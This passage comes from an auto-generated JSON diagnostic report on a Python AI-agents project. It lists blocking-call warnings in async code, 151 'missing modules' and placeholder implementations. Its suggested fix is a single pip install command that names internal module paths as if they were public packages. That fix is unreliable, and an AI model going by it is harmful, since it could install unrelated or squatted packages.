        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.053717"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.053741"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.069764"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.069996"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.070035"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.070073"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.070518"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.070553"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.070588"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.086439"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.086735"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.126728"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.127432"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.127464"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.128034"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.128072"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.152815"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.153561"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.153667"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.153684"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.154153"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\performance_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.154161"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\services.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.298158"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\services.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.298969"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.311812"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.352853"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.353402"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.353482"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\async_optimizer.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.354167"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.361255"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.361484"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.361513"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\cpu_profiler.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.361752"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.378566"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.378748"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\profiling\\performance_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.379193"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.387915"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.388323"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.388598"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.388670"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.388732"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.389002"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment\\deployment_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.389042"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\services\\autonomous_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.408393"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.414115"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.414180"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.414215"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\inspect_agent.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.414306"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.424001"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.424402"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.424424"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.424474"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.424505"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\rl_training_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.424660"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\setup_rl_framework.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.430299"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.438202"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\base_integration.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.467089"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.750449"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.750493"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\processing_service.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.759865"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\webhook_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.770575"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\webhook_service.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.771548"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.807209"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.807963"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.808686"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.826287"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Potentially blocking call: can_use_openai",
        "timestamp": "2025-09-05T17:30:47.848405"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Potentially blocking call: OpenAI",
        "timestamp": "2025-09-05T17:30:47.848427"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\agent_protocol.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.951255"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.965467"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.965491"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.965507"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\meta_orchestrator.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.977631"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\meta_orchestrator.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:47.977795"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\meta_orchestrator.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:47.978631"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\__init__.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:48.008408"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.024656"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.025626"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.025691"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.025748"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.026383"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.027131"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\optimization\\performance_tuner.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.027691"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\protocols\\collaboration.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.045838"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Potentially blocking call: _open_circuit",
        "timestamp": "2025-09-05T17:30:48.062888"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Potentially blocking call: _open_circuit",
        "timestamp": "2025-09-05T17:30:48.062906"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\resilience\\fallback_manager.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:48.065106"
      }
    ]
  },
  "recommendations": [
    {
      "priority": "HIGH",
      "category": "Dependencies",
      "issue": "Missing 151 required modules",
      "fix": "Install missing modules: pip install coordination memory_consolidator optimization.resource_optimizer components.performance_monitor autonomous_service multi_agent_trainer async_optimizer replay_buffer gymnasium utils.auth training monitoring.alerting_system vector_memory azure.cognitiveservices.vision.computervision.models algorithms core.coordination.integration_layer components.real_time_charts web_interface azure.cognitiveservices.vision.computervision examples.demo_agents.document_classifier monitoring base_environment safety profiling.performance_dashboard autonomous_security orchestration examples.demo_integrations.quickbooks_connector security qmix_agent base_algorithm optimization.algorithm_optimizer azure.core.credentials orchestrator deployment_service caching.query_cache meta_demo.web_interface torch.optim performance.optimization.algorithm_optimizer algorithm_optimizer autonomous reasoning_service faiss environments.supply_chain_environment maddpg_agent dashboard_server monitoring.metrics_collector examples.demo_agents.contract_analyzer trading_environment evaluation time_series_processor resource torch.utils.data tree_of_thoughts core.integration.deployment_manager rl.training.curriculum environments.trading_environment api.database.base temporal_agent memory_profiler rl.algorithms.ppo_agent rl.environments.resource_allocation_environment tools.safe_exec_tool resource_allocation_environment behavior_validator security_service agent_repository examples.demo_agents.purchase_order_agent specialized_agents services.data_service objgraph sac_agent profiling.memory_profiler agent_protocol core.integration.master_controller performance.optimization.async_optimizer working_memory autonomous_events meta_demo.business_impact predictive_coordinator algorithms.base_algorithm performance.caching.redis_cache rl.environments.base_environment components.roi_analytics performance_dashboard torch.nn.functional services strategy_optimizer environments.resource_allocation_environment torch.nn self_modification events meta_learning_agent examples.demo_analytics.roi_calculator core.security.security_validator performance.profiling.cpu_profiler training_callbacks monitoring.regression_detector performance.profiling.memory_profiler meta_demo.demo_engine cpu_profiler temporal_reasoning torch redis_cache causal_inference core.autonomous.orchestrator utils.formatting demo_engine rl.training.training_pipeline supply_chain_environment knowledge_transfer pattern_recognizer integration distributed_memory temporal_engine behavioral_monitoring training_pipeline orchestration_service performance_benchmarks profiling.cpu_profiler core.autonomous.self_modification ppo_agent master_controller business_impact chromadb repositories semantic_search pattern_extractor reasoning caching.memory_cache rl.environments.supply_chain_environment interfaces networks meta_demo.visualization algorithms.ppo_agent rl.environments.trading_environment aioredis shared experiment_manager environments.base_environment meta_demo.coordination optimization.async_optimizer environments curriculum caching.redis_cache autonomous.safety components.document_intelligence reasoning_events security_events core.performance.high_performance_optimization statsmodels.tsa.stattools meta_orchestrator",
      "modules": [
        "coordination",
        "memory_consolidator",
        "optimization.resource_optimizer",
        "components.performance_monitor",
        "autonomous_service",
        "multi_agent_trainer",
        "async_optimizer",
        "replay_buffer",
        "gymnasium",
        "utils.auth",
        "training",
        "monitoring.alerting_system",
        "vector_memory",
        "azure.cognitiveservices.vision.computervision.models",
        "algorithms",
        "core.coordination.integration_layer",
        "components.real_time_charts",
        "web_interface",
        "azure.cognitiveservices.vision.computervision",
        "examples.demo_agents.document_classifier",
        "monitoring",
        "base_environment",
        "safety",
        "profiling.performance_dashboard",
        "autonomous_security",
        "orchestration",
        "examples.demo_integrations.quickbooks_connector",
        "security",
        "qmix_agent",
        "base_algorithm",
        "optimization.algorithm_optimizer",
        "azure.core.credentials",
        "orchestrator",
        "deployment_service",
        "caching.query_cache",
        "meta_demo.web_interface",
        "torch.optim",
        "performance.optimization.algorithm_optimizer",
        "algorithm_optimizer",
        "autonomous",
        "reasoning_service",
        "faiss",
        "environments.supply_chain_environment",
        "maddpg_agent",
        "dashboard_server",
        "monitoring.metrics_collector",
        "examples.demo_agents.contract_analyzer",
        "trading_environment",
        "evaluation",
        "time_series_processor",
        "resource",
        "torch.utils.data",
        "tree_of_thoughts",
        "core.integration.deployment_manager",
        "rl.training.curriculum",
        "environments.trading_environment",
        "api.database.base",
        "temporal_agent",
        "memory_profiler",
        "rl.algorithms.ppo_agent",
        "rl.environments.resource_allocation_environment",
        "tools.safe_exec_tool",
        "resource_allocation_environment",
        "behavior_validator",
        "security_service",
        "agent_repository",
        "examples.demo_agents.purchase_order_agent",
        "specialized_agents",
        "services.data_service",
        "objgraph",
        "sac_agent",
        "profiling.memory_profiler",
        "agent_protocol",
        "core.integration.master_controller",
        "performance.optimization.async_optimizer",
        "working_memory",
        "autonomous_events",
        "meta_demo.business_impact",
        "predictive_coordinator",
        "algorithms.base_algorithm",
        "performance.caching.redis_cache",
        "rl.environments.base_environment",
        "components.roi_analytics",
        "performance_dashboard",
        "torch.nn.functional",
        "services",
        "strategy_optimizer",
        "environments.resource_allocation_environment",
        "torch.nn",
        "self_modification",
        "events",
        "meta_learning_agent",
        "examples.demo_analytics.roi_calculator",
        "core.security.security_validator",
        "performance.profiling.cpu_profiler",
        "training_callbacks",
        "monitoring.regression_detector",
        "performance.profiling.memory_profiler",
        "meta_demo.demo_engine",
        "cpu_profiler",
        "temporal_reasoning",
        "torch",
        "redis_cache",
        "causal_inference",
        "core.autonomous.orchestrator",
        "utils.formatting",
        "demo_engine",
        "rl.training.training_pipeline",
        "supply_chain_environment",
        "knowledge_transfer",
        "pattern_recognizer",
        "integration",
        "distributed_memory",
        "temporal_engine",
        "behavioral_monitoring",
        "training_pipeline",
        "orchestration_service",
        "performance_benchmarks",
        "profiling.cpu_profiler",
        "core.autonomous.self_modification",
        "ppo_agent",
        "master_controller",
        "business_impact",
        "chromadb",
        "repositories",
        "semantic_search",
        "pattern_extractor",
        "reasoning",
        "caching.memory_cache",
        "rl.environments.supply_chain_environment",
        "interfaces",
        "networks",
        "meta_demo.visualization",
        "algorithms.ppo_agent",
        "rl.environments.trading_environment",
        "aioredis",
        "shared",
        "experiment_manager",
        "environments.base_environment",
        "meta_demo.coordination",
        "optimization.async_optimizer",
        "environments",
        "curriculum",
        "caching.redis_cache",
        "autonomous.safety",
        "components.document_intelligence",
        "reasoning_events",
        "security_events",
        "core.performance.high_performance_optimization",
        "statsmodels.tsa.stattools",
        "meta_orchestrator"
      ]
    },
    {
      "priority": "HIGH",
      "category": "Implementation",
      "issue": "Found 234 placeholder implementations",
      "fix": "Replace placeholder functions with actual implementations",
      "details": [
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 112,
          "content": "def diagnose_placeholders(self) -> Dict[str, Any]:"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 113,
          "content": "\"\"\"Find placeholder functions and incomplete implementations\"\"\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 114,
          "content": "logger.info(\"Identifying placeholder implementations...\")"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 116,
          "content": "placeholders = []"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 130,
          "content": "# Check for common placeholder patterns"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 132,
          "content": "'pass', 'todo', 'fixme', 'not implemented',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 133,
          "content": "'placeholder', 'mock', 'stub', 'return none',"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 134,
          "content": "'raise notimplementederror', 'coming soon'"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 137,
          "content": "if self._is_problematic_placeholder(line, lines, i-1):"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 139,
          "content": "\"PLACEHOLDER\","
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
          "line": 141,
          "content": "f\"Line {i}: Placeholder implementation - {line.strip()}\""
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
